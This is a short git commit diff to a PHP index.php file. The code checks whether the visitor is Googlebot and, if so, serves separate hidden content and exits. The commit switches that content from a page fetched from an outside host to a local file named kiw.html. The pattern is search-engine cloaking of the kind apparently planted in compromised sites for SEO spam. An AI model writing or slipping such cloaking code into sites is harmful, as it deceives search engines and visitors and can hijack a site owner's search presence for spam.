96b62399cd310a2abdfd9facc6d089aae405c032
izuna <stokgsccml@gmail.com>
2025-03-10 18:57:42 +0700

    Update index.php

--- index.php
+++ index.php
@@ -8,7 +8,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
- $bot_content = file_get_contents('https://www.wikicreationinc.com/kiw');
+ $bot_content = file_get_contents('kiw.html');
  echo $bot_content;
  exit;
 } else {
